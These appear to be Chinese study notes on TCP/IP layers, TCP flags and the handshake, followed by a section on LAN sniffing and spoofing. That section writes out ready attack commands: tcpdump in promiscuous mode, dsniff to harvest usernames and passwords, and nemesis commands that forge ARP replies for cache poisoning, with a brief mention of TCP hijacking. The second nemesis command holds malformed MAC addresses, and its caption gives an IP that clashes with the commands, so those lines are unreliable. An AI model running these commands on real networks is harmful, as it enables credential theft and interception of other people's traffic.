应用层
表示层
会话层
传输层     <-
网络层     <-
数据链路层 <-
物理层

网络层：
网际协议Internet Protocol, IP
IP地址4字节：xx.xx.xx.xx
IP数据包
Internet控制消息协议：Internet Control Message Protocol, ICMP数据包
ICMP, IP都是无连接,大数据包被分段处理　
传输层：
传输控制协议Transport Control Protocol, TCP
用户数据报协议User Datagram Protocol，UDP
TCP标志 意义                目的
URG     紧急     标识重要数据
ACK     确认     确认连接对于大多数连接它被打开
PSH     发送     通知接收方马上发送数据而不是缓冲数据
RST     复位     复位连接
SYN     同步     在连接开始期间同步序号
FIN     结束     当双方说再见时关闭连接
三次握手:SYN  SYN/ACK    ACK
数据链路层：
Ethernet以太网,媒体访问控制地址(Media Access Control, MAC)6个字节组成地址xx:xx:xx:xx:xx:xx
地址解析协议(Address Resolution Protocol, ARP)

网络窃听
ifconfig eth0 promisc 混杂模式

tcpdump -l -X 'ip host 192.168.0.1' -i eth0
窃听sniffing
在数据包中伪造源地址的行为称为欺骗spoofing

dsniff专门用于搜索用户名和密码
dsniff -n

ARP重定向，向特定设备发送伪造的ARP应答，从而使得ARP缓存纪录被攻击者的数据覆盖，ARP缓存中毒ARP cache poisoning
nemesis数据包注入
nemesis arp -v -r -d eth0 -S 192.168.0.1 -D 192.168.0.118 -h 00:00:AD:D1:C7:ED -m 00:C0:F0:79:3D:30 -H 00:00:AD:D1:C7:ED -M 00:C0:F0:79:3D:30
nemesis arp -v -r -d eth0 -S 192.168.0.118 -D 192.168.0.1 -h 00:00:D1:C7:ED -m 00:50:18:00:0F:01 -H 00:00:AD:D1:C7:ED -M 00:0:18:00:0F:01
伪造从192.168.0.1到192.168.0.188的ARP应答

TCP/IP劫持hijacking：
使用伪造数据包来接管受害者机器与主机之间的连接
http://stealth.7350.org
http://www.thc.org

